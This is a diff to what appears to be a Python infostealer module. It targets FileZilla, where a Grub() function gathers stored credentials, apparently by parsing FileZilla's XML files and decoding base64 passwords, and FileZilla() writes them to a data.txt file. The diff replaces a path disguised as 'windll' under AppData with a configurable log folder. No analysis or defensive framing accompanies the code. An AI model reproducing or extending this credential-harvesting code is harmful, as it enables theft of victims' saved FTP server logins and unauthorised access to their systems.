@@ -14,7 +14,7 @@ import os
 import xml.etree.ElementTree as ET
 from base64 import b64decode
 from manager.logger import Log
-
+from preferences.config import config
 
 def getFilezillaDir():
     system = os.name
@@ -76,12 +76,12 @@ def Grub():
             return credentialsData
 
 def FileZilla():
-    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-    path = rf'{pathtofile}\windll\Files\FileZilla'
+    user = os.environ['USERPROFILE']
+    path = f'{user}\\{config.pathToLogs}\\FileZilla'
     try:
         os.makedirs(path)
         data = Grub()
-        with open(rf"{path}\data.txt", "w", encoding="utf-8") as f:
+        with open(f"{path}\\data.txt", "w", encoding="utf-8") as f:
             f.write('\n'.join(str(info) for info in data))
     except Exception as e:
         Log(f"FileZilla ---> {e}")
